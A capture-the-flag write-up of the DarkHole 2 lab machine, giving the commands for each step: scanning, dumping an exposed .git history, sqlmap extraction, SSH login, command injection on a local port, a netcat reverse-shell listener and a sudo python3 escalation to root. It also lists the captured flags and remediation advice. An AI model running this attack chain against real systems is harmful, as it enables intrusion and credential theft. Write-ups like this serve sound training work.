
# 🕳️ DarkHole 2 — Boot2Root Writeup

---

## 📌 Executive Summary
This walkthrough documents the full compromise of the DarkHole 2 vulnerable machine.

The attack began with network enumeration, followed by discovery of an exposed `.git` repository. Sensitive credentials were recovered from commit history, leading to SQL Injection exploitation and SSH access.

Further analysis revealed an internal service vulnerable to Remote Command Execution (RCE), which enabled lateral movement. Finally, a sudo misconfiguration allowed full privilege escalation to root.

---

## 📚 Table of Contents
- Executive Summary  
- Enumeration Phase  
- Exploitation Phase  
- Lateral Movement  
- Privilege Escalation  
- Flags Captured  
- Lessons Learned  
- Attack Chain Summary  
- Vulnerabilities Identified  
- Remediation  
- Tools Used  
- Author & Disclaimer  

---

# 🔍 Walkthrough

---

## 🔎 Enumeration Phase

### 📡 Host Discovery
sudo netdiscover

Target identified:
192.168.119.129

---

### 🔎 Port Scanning
nmap -sV -A -p- -T4 192.168.119.129

Findings:
- 22/tcp → SSH  
- 80/tcp → HTTP  

---

### 🌐 Web Enumeration
Login page discovered on port 80.

Exposed .git directory:
http://192.168.119.129/.git/

---

## 💥 Exploitation Phase

### 📂 Git Information Leakage
wget -r http://192.168.119.129/.git/
git log

git show a4d900a8d85e8938d3601f3cef113ee293028e10

Credentials discovered:
lush@admin.com : 321

---

### 💉 SQL Injection
sqlmap -r request.txt --dbs --batch

Database:
darkhole_2

sqlmap -r request.txt -D darkhole_2 --tables --dump

SSH credentials:
jehad : fool

---

### 🔑 Initial Access
ssh jehad@192.168.119.129

---

## 🔄 Lateral Movement

### 🧠 Local Enumeration
cat ~/.bash_history

Internal service found on port 9999

### ⚡ RCE
curl http://127.0.0.1:9999/?cmd=id

User: losy

---

### 🐚 Reverse Shell
nc -nlvp 5555

python3 reverse shell payload executed

---

## 🔐 Privilege Escalation

sudo -l

(ALL) NOPASSWD: /usr/bin/python3

sudo python3 -c 'import os; os.system("/bin/bash")'

---

## 🏁 Flags Captured
User Flag: DarkH01e{I_life_man_better}  
Root Flag: DarkH01e{Legend!}

---

## 🔗 Attack Chain Summary
Enumeration → Git Exposure → SQL Injection → SSH Access → RCE → Privilege Escalation → Root

---

## ⚠️ Vulnerabilities Identified
- Exposed .git directory  
- Hardcoded credentials  
- SQL Injection  
- RCE service  
- sudo misconfiguration  

---

## 🛡️ Remediation
- Remove .git from production  
- Secure credentials storage  
- Input validation  
- Restrict internal services  
- Audit sudo permissions  

---

## 🛠️ Tools Used
Netdiscover, Nmap, Wget, Git, SQLMap, Netcat, Python3

---

## ✍️ Author
Diane Ally Lamine

---

## ⚠️ Disclaimer
Educational purposes only. Controlled lab environment.
